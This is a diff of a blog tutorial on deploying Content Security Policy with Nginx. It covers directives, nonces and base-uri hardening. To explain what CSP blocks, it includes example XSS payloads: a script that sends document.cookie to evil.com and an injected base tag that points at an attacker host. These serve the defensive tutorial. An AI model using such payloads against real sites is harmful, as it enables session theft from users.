@@ -1,9 +1,9 @@
 ---
-title: "Content Security Policy (CSP) with Nginx: From Zero to A+"
+title: "Content Security Policy (CSP) with Nginx: The Complete Guide"
 slug: "003-implementing-content-security-policy-nginx"
 publishedDate: 2025-12-19
-updatedDate: 2026-02-01
-description: "A step-by-step guide to implementing Content Security Policy (CSP) on Nginx. Learn CSP progressively, from your first policy to a strict A+ rated configuration with nonces, hashes, and strict-dynamic."
+updatedDate: 2026-02-06
+description: "Master Content Security Policy from zero to A+. Learn CSP progressively—from your first header to strict nonces, hashes, strict-dynamic, and Trusted Types. Includes bypass prevention, debugging techniques, and production-ready Nginx configurations."
 coverImage: "../../assets/images/blog/csp-shield.webp"
 tags: ["Nginx", "Security", "CSP"]
 draft: false
@@ -12,6 +12,7 @@ draft: false
 import Callout from "@components/ui/Callout.astro";
 import { Tabs, TabPanel } from "@components/ui/tabs";
 import CompareCode from "@components/ui/CompareCode.astro";
+import BeforeAfter from "@components/ui/BeforeAfter.astro";
 import FileContent from "@components/ui/FileContent.astro";
 import Table from "@components/ui/Table.astro";
 import TerminalCommand from "@components/ui/TerminalCommand.astro";
@@ -24,25 +25,55 @@ import StateNotice from "@components/ui/StateNotice.astro";
 import BrowserSupport from "@components/ui/BrowserSupport.astro";
 import StepByStep from "@components/ui/StepByStep.astro";
 import Prerequisite from "@components/ui/Prerequisite.astro";
+import DecisionTree from "@components/ui/DecisionTree.astro";
+import Timeline from "@components/ui/Timeline.astro";
+import DirectiveCard from "@components/ui/DirectiveCard.astro";
+import Collapsible from "@components/ui/Collapsible.astro";
+import CSPBuilder from "@components/ui/CSPBuilder.astro";
+import HashCalculator from "@components/ui/HashCalculator.astro";
 
-**Cross-Site Scripting (XSS)** remains one of the most prevalent and dangerous web vulnerabilities, consistently ranking in OWASP's Top 10. According to recent security research, XSS vulnerabilities account for approximately 40% of all reported web application security issues. Attackers exploit these vulnerabilities to inject malicious scripts that can steal cookies, hijack user sessions, redirect visitors to malicious sites, or perform unauthorized actions on behalf of authenticated users.
+**Cross-Site Scripting (XSS)** remains one of the most devastating web vulnerabilities, consistently ranking in OWASP's Top 10 and accounting for approximately **40% of all reported web application security issues**. According to [Google's security research](https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/), even websites with CSP often fail to implement it correctly—**94.72% of allowlist-based CSPs can be bypassed**.
 
-**Content Security Policy (CSP)** is your best defense against these attacks. Think of it as a whitelist or "guest list" for your website—you explicitly tell the browser which resources (scripts, styles, images, etc.) are allowed to load and execute. Anything not on the list gets blocked, even if an attacker manages to inject malicious code into your page.
+**Content Security Policy (CSP)** is your browser-level defense against these attacks. Think of it as a strict "guest list" for your website—you explicitly tell the browser which resources (scripts, styles, images) are allowed to execute. Anything not on the list gets blocked, even if an attacker manages to inject malicious code.
 
-In this guide, you'll learn CSP from the ground up. We'll start with a one-line policy, then progressively build toward a strict, A+ rated configuration. By the end, you'll understand not just *how* to implement CSP, but *why* each directive matters and how they work together to protect your users.
+This guide takes you from zero to a production-ready, **A+ rated** CSP configuration. You'll learn not just the "how" but the "why" behind each directive, understand modern bypass techniques and how to prevent them, and discover advanced topics like Trusted Types for DOM-based XSS prevention.
 
-<TLDRSummary title="Key Takeaways">
-  - **Start simple**: Begin with `default-src 'self'` and add directives progressively
-  - **Use nonces over allowlists**: 94% of allowlist CSPs can be bypassed; nonces are much stronger
-  - **Static sites can use nonces**: Nginx's `sub_filter` replaces placeholders with real nonces at request time
-  - **Go strict with `'strict-dynamic'`**: Trust propagates from nonced scripts to dynamically loaded ones
-  - **Migration path**: Always deploy in report-only mode first, then gradually enforce
-  - **Essential directives**: `object-src 'none'` and `base-uri 'none'` are required for strict CSP
+<TLDRSummary title="What You'll Learn">
+  - **Start with one line**: `default-src 'self'` gives you immediate protection
+  - **Use nonces, not allowlists**: 94.72% of allowlist CSPs can be bypassed; nonces are cryptographically secure
+  - **Static sites can use nonces**: Nginx's `sub_filter` replaces placeholders at request time
+  - **Adopt `strict-dynamic`**: Trust propagates from nonced scripts to dynamically loaded ones
+  - **Include security hardening**: `object-src 'none'` and `base-uri 'none'` are mandatory for strict CSP
+  - **Trusted Types**: The next evolution for DOM-based XSS prevention (CSP Level 3)
+  - **Deploy safely**: Always start in report-only mode before enforcing
 </TLDRSummary>
+
+<Prerequisite title="Before You Start">
+  - A web server running **Nginx 1.19+** (for `$request_id` nonce support)
+  - Basic understanding of HTTP headers
+  - Access to your Nginx configuration files
+  - A website to protect (static or dynamic)
+</Prerequisite>
 
 ---
 
-## Your first CSP in 5 minutes
+## The Evolution of CSP
+
+Content Security Policy has evolved significantly since its introduction. Understanding this evolution helps you appreciate why modern "strict CSP" approaches exist.
+
+<Timeline events={[
+  { date: "2010", title: "X-Content-Security-Policy", description: "Mozilla introduces the first CSP implementation as an experimental header", type: "default" },
+  { date: "2012", title: "CSP Level 1", description: "W3C standardizes CSP with basic fetch directives (script-src, style-src, etc.)", type: "milestone" },
+  { date: "2015", title: "CSP Level 2", description: "Introduces nonces, hashes, and frame-ancestors. 'unsafe-inline' can be overridden by nonces", type: "milestone" },
+  { date: "2016", title: "Google Research", description: "Google publishes 'CSP Is Dead, Long Live CSP' showing 94.72% of allowlist CSPs are bypassable", type: "warning" },
+  { date: "2018", title: "strict-dynamic", description: "New keyword allows trusted scripts to load dependencies without explicit allowlisting", type: "success" },
+  { date: "2023", title: "CSP Level 3", description: "Introduces Trusted Types, report-to, and improved WebAssembly support", type: "milestone" },
+  { date: "2024+", title: "Trusted Types Adoption", description: "Browser support matures; enterprises begin adopting for DOM-XSS prevention", type: "success" },
+]} />
+
+---
+
+## Your First CSP in 5 Minutes
 
 Let's get a working CSP right now. Open your Nginx configuration and add this single header:
 
@@ -68,7 +99,7 @@ sudo nginx -t && sudo systemctl reload nginx
 ```
 </TerminalCommand>
 
-**That's it!** You now have a working CSP. Open your browser's DevTools (F12 → Console) and look for CSP violations. You might see errors like:
+**That's it!** You now have a working CSP. Open your browser's DevTools (F12 → Console) to see any violations:
 
 <TerminalOutput title="Browser Console">
 Refused to load the script 'https://cdn.example.com/analytics.js' because it 
@@ -78,47 +109,57 @@ violates the following Content Security Policy directive: "default-src 'self'".
 <Callout type="keypoint" icon="mdi:lightbulb">
   **What just happened?**
   
-  `default-src 'self'` tells the browser: "Only allow resources from the same origin." This blocks:
-  - External scripts (CDNs, analytics)
-  - Inline scripts (`<script>alert('hi')</script>`)
-  - Inline styles
-  - External images, fonts, and more
+  `default-src 'self'` tells the browser: "Only allow resources from this exact origin (same scheme, host, and port)." This immediately blocks:
+  - External scripts (CDNs, analytics, tracking)
+  - Inline scripts (`<script>alert('xss')</script>`)
+  - Inline styles (`style="..."`)
+  - External images, fonts, and frames
   
-  This is intentionally restrictive. We'll relax it strategically in the next sections.
+  This is intentionally restrictive—we'll selectively relax it next.
 </Callout>
 
 ---
 
-## Understanding CSP: the whitelist concept
+## Understanding CSP: The Whitelist Concept
 
-CSP works by defining **what's allowed**, not what's blocked. Think of it as a guest list for a party—only resources on the list get in.
+CSP works by defining **what's allowed**, not what's blocked. Think of it as a VIP list at an exclusive event—only resources on the list get in.
 
-<Mermaid caption="CSP acts as a gatekeeper for browser resources" maxWidth="600px">
+<Mermaid caption="CSP acts as a gatekeeper for all browser resources" maxWidth="650px">
 ```mermaid-render
 flowchart LR
     subgraph Browser["Browser"]
         CSP["CSP Policy"]:::cspPolicy
     end
     
-    A["Your scripts"]:::cspTrusted --> CSP
-    B["CDN scripts"] --> CSP
-    C["Inline scripts"] --> CSP
-    D["Malicious scripts"]:::attacker --> CSP
+    A["Your scripts\n(self)"]:::cspTrusted --> CSP
+    B["CDN scripts\n(external)"] --> CSP
+    C["Inline scripts\n(<script>...</script>)"] --> CSP
+    D["Injected XSS\nscripts"]:::attacker --> CSP
     
-    CSP -->|"Allowed"| E["Execute"]:::cspTrusted
-    CSP -->|"Blocked"| F["Reject"]:::cspBlocked
+    CSP -->|"✓ Allowed"| E["Execute"]:::cspTrusted
+    CSP -->|"✗ Blocked"| F["Reject"]:::cspBlocked
 ```
 </Mermaid>
 
-### Why CSP matters
+### Why CSP Matters: The Defense-in-Depth Principle
 
-Without CSP, if an attacker manages to inject `<script>stealCookies()</script>` into your page (via a comment form, URL parameter, or database), the browser will happily execute it. With CSP, the browser checks if inline scripts are allowed—and if not, blocks the attack.
+Without CSP, if an attacker injects `<script>stealCookies()</script>` into your page (via a comment form, URL parameter, or database), the browser happily executes it—there's no way to distinguish legitimate scripts from malicious ones.
 
-### How XSS attacks work (and how CSP stops them)
+With CSP, the browser checks every resource against your policy **before** execution. If inline scripts aren't explicitly allowed, the attack is neutralized at the browser level.
 
-Let's trace a typical XSS attack scenario:
+<Callout type="keypoint" icon="mdi:shield">
+  **CSP is a second line of defense.**
+  
+  CSP doesn't prevent injection from happening—you should still sanitize user input and use parameterized queries. But when input validation fails (and it will eventually), CSP catches the attack at the browser level, preventing execution.
+</Callout>
 
-<Mermaid caption="XSS attack flow without CSP protection" maxWidth="700px">
+---
+
+## How XSS Attacks Work (and How CSP Stops Them)
+
+To understand CSP's value, let's trace a typical XSS attack:
+
+<Mermaid caption="XSS attack flow without CSP protection" maxWidth="750px">
 ```mermaid-render
 sequenceDiagram
     participant Attacker
@@ -127,422 +168,356 @@ sequenceDiagram
     participant Evil as Attacker's Server
     
     Attacker->>Website: Submit malicious comment<br/>containing script tag
-    Note over Website: Comment stored in database
+    Note over Website: Comment stored in database<br/>(no sanitization)
     
     Victim->>Website: Visit page with comments
     Website->>Victim: HTML with injected script
-    Victim->>Victim: Browser executes malicious script
-    Victim->>Evil: Script sends cookies/data to attacker
+    Note over Victim: Browser sees <script> tag<br/>and executes it
+    Victim->>Evil: Script sends cookies/session<br/>tokens to attacker
+    Note over Evil: Attacker now has<br/>victim's session
 ```
 </Mermaid>
 
-**Step-by-step breakdown:**
+### Step-by-Step Breakdown
 
-1. **Injection**: Attacker submits a comment containing `<script>fetch('https://evil.com?cookie='+document.cookie)</script>`
+1. **Injection**: Attacker submits a comment containing:
+   ```html
+   <script>fetch('https://evil.com?c='+document.cookie)</script>
+   ```
+
 2. **Storage**: The website stores this in the database without proper sanitization
+
 3. **Delivery**: When another user views the page, the malicious script is served as part of the HTML
+
 4. **Execution**: The browser sees a `<script>` tag and executes it—no questions asked
-5. **Exfiltration**: The script sends the victim's cookies (including session tokens) to the attacker
 
-**With CSP (`script-src 'self'`)**, step 4 fails. The browser checks: "Is this an inline script? Is that allowed?" Since inline scripts are blocked by default, the attack is neutralized.
+5. **Exfiltration**: The script sends session cookies to the attacker's server
 
-<Callout type="keypoint" icon="mdi:shield">
-  **CSP is a second line of defense.**
-  
-  CSP doesn't prevent the injection from happening—you should still sanitize user input. But when input validation fails (and it will eventually), CSP catches the attack at the browser level, preventing execution.
-</Callout>
+### How CSP Breaks the Chain
 
-### Attack vectors CSP prevents
+**With CSP (`script-src 'self'`)**, step 4 fails. The browser checks: "Is this an inline script? Is `'unsafe-inline'` allowed?" Since inline scripts are blocked by default, the attack is neutralized:
 
-CSP isn't just about stopping script injection—it's a comprehensive security layer that addresses multiple attack categories. The table below shows how different CSP directives work together to create defense-in-depth. Notice how each threat type maps to a specific directive, which is why a complete CSP policy includes more than just `script-src`.
+<TerminalOutput title="Browser Console with CSP">
+Refused to execute inline script because it violates the following 
+Content Security Policy directive: "script-src 'self'". Either the 
+'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') 
+is required to enable inline execution.
+</TerminalOutput>
+
+---
+
+## Attack Vectors CSP Prevents
+
+CSP addresses multiple threat categories. Here's how different directives create defense-in-depth:
 
 <Table title="Common Threats Mitigated by CSP">
   <thead>
     <tr>
       <th>Threat</th>
-      <th>How CSP Helps</th>
-      <th>Key Directive</th>
+      <th>Attack Vector</th>
+      <th>CSP Defense</th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td><strong>Reflected XSS</strong></td>
-      <td>Blocks inline scripts injected via URL parameters</td>
+      <td>Scripts injected via URL parameters</td>
       <td><code>script-src</code> without <code>'unsafe-inline'</code></td>
     </tr>
     <tr>
       <td><strong>Stored XSS</strong></td>
-      <td>Blocks scripts injected via database content</td>
+      <td>Scripts injected via database content</td>
       <td><code>script-src</code> with nonces/hashes</td>
     </tr>
     <tr>
       <td><strong>DOM-based XSS</strong></td>
-      <td>Blocks <code>eval()</code> and similar dynamic execution</td>
-      <td><code>script-src</code> without <code>'unsafe-eval'</code></td>
+      <td><code>eval()</code>, <code>innerHTML</code> abuse</td>
+      <td><code>script-src</code> without <code>'unsafe-eval'</code> + Trusted Types</td>
     </tr>
     <tr>
       <td><strong>Data exfiltration</strong></td>
-      <td>Limits where data can be sent via XHR/fetch</td>
+      <td>XHR/fetch to attacker servers</td>
       <td><code>connect-src 'self'</code></td>
     </tr>
     <tr>
       <td><strong>Clickjacking</strong></td>
-      <td>Prevents site from being framed by attackers</td>
+      <td>Site framed by malicious page</td>
       <td><code>frame-ancestors 'none'</code></td>
     </tr>
     <tr>
       <td><strong>Mixed content</strong></td>
-      <td>Automatically upgrades HTTP requests to HTTPS</td>
+      <td>HTTP resources on HTTPS pages</td>
       <td><code>upgrade-insecure-requests</code></td>
     </tr>
     <tr>
-      <td><strong>Plugin-based attacks</strong></td>
-      <td>Blocks Flash, Java, and other plugin vulnerabilities</td>
+      <td><strong>Plugin attacks</strong></td>
+      <td>Flash, Java, PDF exploits</td>
       <td><code>object-src 'none'</code></td>
+    </tr>
+    <tr>
+      <td><strong>Form hijacking</strong></td>
+      <td>Injected forms to steal credentials</td>
+      <td><code>form-action 'self'</code></td>
+    </tr>
+    <tr>
+      <td><strong>Base tag injection</strong></td>
+      <td>Redirecting relative URLs to attacker</td>
+      <td><code>base-uri 'none'</code></td>
     </tr>
   </tbody>
 </Table>
 
-
 ---
 
-## CSP directives: learn by doing
+## CSP Directives: Learn by Doing
 
-Instead of memorizing a table, let's learn each directive by adding it to our policy. We'll start with the most important ones.
+Instead of memorizing tables, let's learn each directive by adding it to our policy progressively.
 
-### 1. `default-src`: the fallback
+### 1. `default-src`: The Fallback
 
-This is the catch-all. If you don't specify a directive for a resource type, `default-src` applies.
+This is the catch-all directive. If you don't specify a directive for a resource type, `default-src` applies.
 
-<Code lang="nginx" aria-label="default-src directive">
+<DirectiveCard
+  name="default-src"
+  syntax="default-src <source-list>"
+  description="Fallback for all unspecified fetch directives. Set this restrictively and add specific directives as needed."
+  defaultValue="* (allow all)"
+  since="CSP Level 1"
+  mdnUrl="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/default-src"
+>
+  **Best practice:** Set `default-src 'none'` and explicitly allow what you need. This is the "deny by default" approach that security professionals recommend.
+</DirectiveCard>
+
+<Code lang="nginx" title="default-src directive">
 ```nginx
-# Everything must come from our origin
-Content-Security-Policy: default-src 'self';
+# Block everything by default - explicitly allow what you need
+Content-Security-Policy: default-src 'none';
 ```
 </Code>
 
-<Callout type="tip">
-  **Best practice:** Set `default-src 'none'` and explicitly allow what you need. This is the "deny by default" approach.
-</Callout>
+### 2. `script-src`: The Most Critical Directive
 
-### 2. `script-src`: controlling JavaScript
+This controls which scripts can execute on your page. Get this wrong and your entire CSP is effectively useless.
 
-This is the **most critical** directive. It controls which scripts can execute on your page.
-
-<Code lang="nginx" aria-label="script-src directive">
-```nginx
-# Allow scripts from our origin only
-Content-Security-Policy: default-src 'none'; script-src 'self';
-```
-</Code>
+<DirectiveCard
+  name="script-src"
+  syntax="script-src <source-list>"
+  description="Specifies valid sources for JavaScript. This is the most important directive for XSS protection."
+  defaultValue="Falls back to default-src"
+  since="CSP Level 1"
+  mdnUrl="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src"
+/>
 
 <Table title="script-src Source Values">
   <thead>
     <tr>
       <th>Value</th>
-      <th>Description</th>
+      <th>Meaning</th>
       <th>Security</th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td><code>'self'</code></td>
-      <td>Same origin only (same scheme, host, and port)</td>
-      <td>Safe</td>
+      <td>Same origin only (scheme + host + port)</td>
+      <td data-status="success">Safe</td>
     </tr>
     <tr>
       <td><code>'none'</code></td>
       <td>Block all scripts entirely</td>
-      <td>Maximum</td>
+      <td data-status="success">Maximum</td>
+    </tr>
+    <tr>
+      <td><code>'nonce-&#123;random&#125;'</code></td>
+      <td>Allow scripts with matching nonce attribute</td>
+      <td data-status="success">Recommended</td>
+    </tr>
+    <tr>
+      <td><code>'sha256-&#123;hash&#125;'</code></td>
+      <td>Allow scripts with matching content hash</td>
+      <td data-status="success">Strong</td>
+    </tr>
+    <tr>
+      <td><code>'strict-dynamic'</code></td>
+      <td>Trust propagates to dynamically loaded scripts</td>
+      <td data-status="success">Strong</td>
     </tr>
     <tr>
       <td><code>https://cdn.example.com</code></td>
       <td>Allow scripts from specific domain</td>
-      <td>Weak (bypassable)</td>
-    </tr>
-    <tr>
-      <td><code>'nonce-abc123'</code></td>
-      <td>Allow scripts with matching <code>nonce</code> attribute</td>
-      <td>Strong (recommended)</td>
-    </tr>
-    <tr>
-      <td><code>'sha256-...'</code></td>
-      <td>Allow scripts matching specific content hash</td>
-      <td>Strong</td>
-    </tr>
-    <tr>
-      <td><code>'strict-dynamic'</code></td>
-      <td>Trust scripts loaded by already-trusted scripts</td>
-      <td>Strong</td>
+      <td data-status="warning">Weak (bypassable)</td>
     </tr>
     <tr>
       <td><code>'unsafe-inline'</code></td>
-      <td>Allow inline scripts (event handlers, script tags)</td>
-      <td><strong>Dangerous</strong></td>
+      <td>Allow all inline scripts</td>
+      <td data-status="error">Dangerous</td>
     </tr>
     <tr>
       <td><code>'unsafe-eval'</code></td>
-      <td>Allow <code>eval()</code>, <code>Function()</code>, <code>setTimeout('code')</code></td>
-      <td><strong>Dangerous</strong></td>
+      <td>Allow <code>eval()</code>, <code>Function()</code>, etc.</td>
+      <td data-status="error">Dangerous</td>
     </tr>
   </tbody>
 </Table>
 
 <Callout type="warning">
-  **Never use `'unsafe-inline'` for scripts** in production. It allows attackers to execute injected inline scripts—the exact attack CSP is meant to prevent. The entire point of CSP is lost with this value.
+  **Never use `'unsafe-inline'` for scripts in production.** It allows attackers to execute any injected inline script—the exact attack CSP is meant to prevent. If you see this in your policy, your CSP provides essentially zero XSS protection.
 </Callout>
 
-### 3. `style-src`: controlling CSS
+### 3. `style-src`: CSS Control
 
-<Code lang="nginx" aria-label="style-src directive">
+<DirectiveCard
+  name="style-src"
+  syntax="style-src <source-list>"
+  description="Specifies valid sources for stylesheets. Less critical than script-src but still important for comprehensive protection."
+  defaultValue="Falls back to default-src"
+  since="CSP Level 1"
+  mdnUrl="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/style-src"
+/>
+
+<Code lang="nginx" title="style-src with unsafe-inline">
 ```nginx
-# Allow styles from our origin, plus inline styles
-Content-Security-Policy: 
-    default-src 'none'; 
-    script-src 'self'; 
-    style-src 'self' 'unsafe-inline';
+# Allow styles from same origin + inline styles
+style-src 'self' 'unsafe-inline';
 ```
 </Code>
 
 <Callout type="info">
-  **Why `'unsafe-inline'` for styles?** Unlike scripts, inline styles are much less dangerous. Many CSS-in-JS libraries require it. While you can use nonces/hashes for styles too, the security benefit is smaller.
+  **Why `'unsafe-inline'` for styles is often acceptable:**
+  
+  Unlike scripts, inline styles have a much smaller attack surface. Many CSS-in-JS libraries and frameworks require inline styles for hydration. While you *can* use nonces/hashes for styles too, the security benefit is smaller compared to the implementation complexity.
 </Callout>
 
-### 4. `img-src`: images
+### 4. Resource Directives
 
-<Code lang="nginx" aria-label="img-src directive">
+<Tabs>
+  <TabPanel label="img-src">
+    ```nginx
+    # Allow images from same origin + data: URIs (for base64)
+    img-src 'self' data:;
+    ```
+    
+    `data:` is often needed for base64-encoded images, SVG icons, or placeholder images.
+  </TabPanel>
+  <TabPanel label="font-src">
+    ```nginx
+    # Allow fonts from same origin only
+    font-src 'self';
+    
+    # Or allow Google Fonts
+    font-src 'self' https://fonts.gstatic.com;
+    ```
+  </TabPanel>
+  <TabPanel label="connect-src">
+    ```nginx
+    # Restrict XHR/Fetch/WebSocket destinations
+    # Critical for preventing data exfiltration
+    connect-src 'self' https://api.example.com;
+    ```
+    
+    This controls where JavaScript can send data. Critical for preventing stolen data from being sent to attacker servers.
+  </TabPanel>
+  <TabPanel label="media-src">
+    ```nginx
+    # Audio and video sources
+    media-src 'self';
+    ```
+  </TabPanel>
+</Tabs>
+
+### 5. Security Hardening Directives
+
+These are often overlooked but are **required for strict CSP**:
+
+#### `object-src 'none'` — Block Plugins
+
+Plugins like Flash and Java have historically been major vulnerability vectors. Although Flash is deprecated, blocking `object-src` prevents any plugin-based attacks:
+
+<Code lang="nginx" title="object-src directive">
 ```nginx
-# Allow images from our origin and data: URIs (for base64 images)
-img-src 'self' data:;
-```
-</Code>
-
-### 5. `font-src`: web fonts
-
-<Code lang="nginx" aria-label="font-src directive">
-```nginx
-# Allow fonts from our origin
-font-src 'self';
-```
-</Code>
-
-### 6. `connect-src`: XHR, Fetch, WebSocket
-
-This controls where your JavaScript can send data. Critical for preventing data exfiltration.
-
-<Code lang="nginx" aria-label="connect-src directive">
-```nginx
-# Allow API calls to our origin and GitHub API
-connect-src 'self' https://api.github.com;
-```
-</Code>
-
-### 7. `frame-ancestors`: clickjacking protection
-
-This prevents your site from being embedded in iframes on other sites.
-
-<Code lang="nginx" aria-label="frame-ancestors directive">
-```nginx
-# Don't allow embedding anywhere
-frame-ancestors 'none';
-```
-</Code>
-
-<Callout type="keypoint">
-  `frame-ancestors` replaces the older `X-Frame-Options` header and offers more control.
-</Callout>
-
-### 8. Security hardening directives
-
-These directives close attack vectors that are often overlooked:
-
-#### `object-src 'none'` — Block plugins
-
-Plugins like Flash and Java have historically been major security vulnerabilities. Even though Flash is deprecated, blocking `object-src` prevents any plugin-based attacks:
-
-<Code lang="nginx" aria-label="object-src directive">
-```nginx
-# Block all plugins (Flash, Java, Silverlight, etc.)
+# Block all plugins (Flash, Java, Silverlight, PDF viewers)
 object-src 'none';
 ```
 </Code>
 
 <Callout type="keypoint">
-  **Required for strict CSP.** Without `object-src 'none'`, attackers could potentially use plugins to bypass your script restrictions.
+  **Required for strict CSP.** Without `object-src 'none'`, attackers could potentially use plugin vulnerabilities to bypass your script restrictions.
 </Callout>
 
-#### `base-uri 'none'` — Prevent base tag injection
+#### `base-uri 'none'` — Prevent Base Tag Injection
 
 The `<base>` tag defines a base URL for all relative URLs in a document. If an attacker injects a `<base>` tag, they can redirect all your relative URLs to their server:
 
-<Code lang="html" aria-label="base tag attack example">
-```html
-<!-- Attacker injects this before your content -->
-<base href="https://attacker.com/">
+<BeforeAfter beforeLabel="Attack Without base-uri" afterLabel="With base-uri 'none'">
+  <div slot="before">
+    ```html
+    <!-- Attacker injects this -->
+    <base href="https://evil.com/">
+    
+    <!-- Your existing code now loads from attacker! -->
+    <script src="/js/app.js"></script>
+    <!-- Loads https://evil.com/js/app.js -->
+    ```
+  </div>
+  <div slot="after">
+    ```http
+    Content-Security-Policy: base-uri 'none'
+    
+    <!-- Injection attempt blocked! -->
+    Refused to set the document's base URI to 
+    'https://evil.com/' because it violates CSP.
+    ```
+  </div>
+</BeforeAfter>
 
-<!-- Your existing code now loads from attacker's server! -->
-<script src="/js/app.js"></script>  <!-- Loads https://attacker.com/js/app.js -->
+#### `frame-ancestors 'none'` — Clickjacking Protection
+
+Prevents your site from being embedded in iframes on other sites:
+
+<Code lang="nginx" title="frame-ancestors directive">
+```nginx
+# Don't allow embedding anywhere (replaces X-Frame-Options)
+frame-ancestors 'none';
+
+# Or allow embedding only on your own domain
+frame-ancestors 'self';
 ```
 </Code>
 
-<Code lang="nginx" aria-label="base-uri directive">
+<Callout type="tip">
+  `frame-ancestors` is more flexible than the older `X-Frame-Options` header and should be preferred. However, for maximum browser compatibility, you can set both.
+</Callout>
+
+#### `form-action 'self'` — Control Form Submissions
+
+Prevents attackers from injecting forms that submit data to their servers:
+
+<Code lang="nginx" title="form-action directive">
 ```nginx
-# Block base tag injection attacks
-base-uri 'none';
-```
-</Code>
-
-#### `form-action 'self'` — Control form submissions
-
-Prevents attackers from injecting forms that submit data to external servers:
-
-<Code lang="nginx" aria-label="form-action directive">
-```nginx
-# Forms can only submit to our own domain
+# Forms can only submit to your own domain
 form-action 'self';
 ```
 </Code>
 
-#### `upgrade-insecure-requests` — Force HTTPS
-
-Automatically upgrades HTTP requests to HTTPS. Essential for sites served over HTTPS:
-
-<Code lang="nginx" aria-label="upgrade-insecure-requests directive">
-```nginx
-# Convert http://example.com/image.jpg to https://
-upgrade-insecure-requests;
-```
-</Code>
-
-### CSP Directives Reference
-
-Now that you understand the most important directives through hands-on examples, here's a complete reference for when you need to look up specific functionality. These tables are organized by category and link directly to MDN documentation for deeper reading.
-
-Remember: you don't need to memorize all of these. Most sites only need a handful of directives. The key is understanding which category each resource falls into, then consulting this reference when you encounter new requirements.
-
-#### Fetch directives
-
-Fetch directives are the workhorses of CSP—they control where specific types of resources can be loaded from. When a resource doesn't have its own directive defined, it falls back to `default-src`. This is why setting `default-src 'none'` and then explicitly allowing what you need is the safest approach.
-
-<Table title="Fetch Directives Reference">
-  <thead>
-    <tr>
-      <th>Directive</th>
-      <th>Controls</th>
-      <th>Recommended Value</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/default-src" target="_blank" rel="noopener noreferrer"><code>default-src</code></a></td>
-      <td>Fallback for all unspecified fetch directives</td>
-      <td><code>'none'</code> (be explicit)</td>
-    </tr>
-    <tr>
-      <td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src" target="_blank" rel="noopener noreferrer"><code>script-src</code></a></td>
-      <td>JavaScript sources and inline scripts</td>
-      <td><code>'nonce-...' 'strict-dynamic'</code></td>
-    </tr>
-    <tr>
-      <td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/style-src" target="_blank" rel="noopener noreferrer"><code>style-src</code></a></td>
-      <td>CSS stylesheets and inline styles</td>
-      <td><code>'self'</code> + hashes if needed</td>
-    </tr>
-    <tr>
-      <td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/img-src" target="_blank" rel="noopener noreferrer"><code>img-src</code></a></td>
-      <td>Image sources</td>
-      <td><code>'self' data:</code></td>
-    </tr>
-    <tr>
-      <td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/font-src" target="_blank" rel="noopener noreferrer"><code>font-src</code></a></td>
-      <td>Web font sources</td>
-      <td><code>'self'</code> or CDN domain</td>
-    </tr>
-    <tr>
-      <td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src" target="_blank" rel="noopener noreferrer"><code>connect-src</code></a></td>
-      <td>XHR, Fetch, WebSocket, EventSource</td>
-      <td><code>'self'</code> + API domains</td>
-    </tr>
-    <tr>
-      <td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/media-src" target="_blank" rel="noopener noreferrer"><code>media-src</code></a></td>
-      <td>Audio/video sources</td>
-      <td><code>'self'</code> or <code>'none'</code></td>
-    </tr>
-    <tr>
-      <td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/object-src" target="_blank" rel="noopener noreferrer"><code>object-src</code></a></td>
-      <td>Plugins (Flash, Java, etc.)</td>
-      <td><code>'none'</code> (critical!)</td>
-    </tr>
-    <tr>
-      <td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-src" target="_blank" rel="noopener noreferrer"><code>frame-src</code></a></td>
-      <td>Sources for iframes</td>
-      <td><code>'none'</code> or trusted sources</td>
-    </tr>
-    <tr>
-      <td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/worker-src" target="_blank" rel="noopener noreferrer"><code>worker-src</code></a></td>
-      <td>Worker, SharedWorker, ServiceWorker</td>
-      <td><code>'self'</code></td>
-    </tr>
-  </tbody>
-</Table>
-
-#### Document and navigation directives
-
-While fetch directives control *what* can load, document and navigation directives control *how* your page behaves and *where* it can go. These are often overlooked but are critical for comprehensive protection. A common mistake is focusing only on script-src while leaving these directives undefined, which can create security gaps.
-
-<Table title="Document & Navigation Directives Reference">
-  <thead>
-    <tr>
-      <th>Directive</th>
-      <th>Purpose</th>
-      <th>Recommended Value</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/base-uri" target="_blank" rel="noopener noreferrer"><code>base-uri</code></a></td>
-      <td>Restricts URLs in <code>&lt;base&gt;</code> element</td>
-      <td><code>'none'</code> (prevents injection)</td>
-    </tr>
-    <tr>
-      <td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/form-action" target="_blank" rel="noopener noreferrer"><code>form-action</code></a></td>
-      <td>URLs that can be form submission targets</td>
-      <td><code>'self'</code> (anti-phishing)</td>
-    </tr>
-    <tr>
-      <td><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors" target="_blank" rel="noopener noreferrer"><code>frame-ancestors</code></a></td>
-      <td>Who can embed this page</td>
-      <td><code>'none'</code> (anti-clickjacking)</td>
-    </tr>
-    <tr>
